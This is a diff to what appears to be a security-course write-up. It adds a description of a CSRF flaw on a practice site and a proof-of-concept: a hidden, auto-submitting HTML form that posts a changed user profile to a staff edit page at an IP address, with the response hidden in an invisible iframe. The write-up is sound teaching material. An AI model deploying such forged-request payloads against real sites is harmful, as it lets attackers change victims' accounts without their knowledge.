@@ -109,7 +109,15 @@ Green site allows sessions to be a year old, and never regenerates the session I
 
 ## Red
 
-Vulnerability #1: 
+Vulnerability #1: Cross Site Request Forgery
+
+    The blue site doesn't need a CSRF token to carry out admin-level work, such as editing a user's profile. By creating a hidden form that is automatically submitted (without notifying the user of submission results), we can be stealthy. For example, by using a hidden form which will not display submission results, we can send a POST request by linking it to a logged in admin. In this example, I've linked the malicious form to the admin through the "contact us" page.
+    
+    ```
+    <html><body onload="document.bank_form.submit()"><form action="https://35.184.242.122/red/public/staff/users/edit.php?id=4" method="POST" name="bank_form" style="display: none;" target="hidden_results" ><input type="text" name="first_name" value="MALICIOUSALTEREDVALUE"/><input type="text"/></form> <iframe name="hidden_results" style="display: none;"></iframe> </body> </html>
+    ```
+
+![Gif of 8](https://github.com/jonkillinger/FacebookCyberSecurityCourseWeek8/blob/master/8.gif?raw=true) 
 
 Vulnerability #2: IDOR
 
